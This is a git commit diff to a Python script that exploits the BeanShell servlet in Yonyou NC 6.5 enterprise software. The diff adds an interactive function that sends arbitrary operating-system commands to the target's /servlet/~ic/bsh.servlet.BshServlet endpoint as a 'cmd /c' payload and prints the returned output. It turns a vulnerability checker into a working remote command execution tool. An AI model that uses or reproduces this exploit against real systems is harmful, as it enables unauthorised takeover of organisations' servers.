31020a44e937d604110729caacc57d72647acd29
ImLazyB0y <ImLazyB0y@hotmail.com>
2021-06-30 17:45:34 +0800

    update

--- yonyou-beanshell-rce.py
+++ yonyou-beanshell-rce.py
@@ -6,24 +6,48 @@
 
 import requests
 import sys
+from urllib.parse import quote
+import re
 
 def check(target_url):
 
-    print("Checking for vulnerabilities")
+    print("\033[1m[-]Detecting vulnerabilities!\n\033[0m")
     url = target_url + "/servlet/~ic/bsh.servlet.BshServlet"
     headers = {
-        "User-Agent":"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
     }
     try:
         response = requests.get(url=url, headers=headers, timeout=5)
         if response.status_code == 200 and "BeanShell" in response.text:
-            print("The BeanShell page exists, and there may be vulnerabilities:\n{}".format(url))
+            print("\033[33m[+]The BeanShell page exists, and there may be vulnerabilities:{}\033[0m".format(url))
             return url
         else:
-            print("Vulnerability does not exist")
+            print("\033[32mVulnerability does not exist\033[0m")
             sys.exit(0)
     except:
-        print("Unable to establish connection with target")
+        print("Unable to connect to target")
+        sys.exit(0)
+
+def rce(url):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    command = str(input("\ncommand："))
+    if command:
+        data = "bsh.script=" + quote('exec("cmd /c {}");'.format(command))
+        # print(data)
+        try:
+            response = requests.post(
+                url=url, headers=headers, data=data
+            )
+            pattern = re.compile("<pre>(.*?)</pre>", re.S)
+            result = re.search(pattern, response.text)
+            print(result[0].replace('<pre>', '').replace('</pre>', ''))
+        except:
+            print("Command execution failed")
+            sys.exit(0)
+    else:
         sys.exit(0)
 
 
@@ -38,10 +62,10 @@ if __name__ == "__main__":
                         __/ |              __/ |
                         |___/              |___/ 
 
-                                用友NC6.5版本
-                                ---yonyou-beanshell-rce
+                                
+                                ---用友NC 6.5版本Beanshell命令执行
         '''
     print(msg)
     target_url = str(sys.argv[1])
     vulurl = check(target_url)
-    print(vulurl)
+    rce(vulurl)
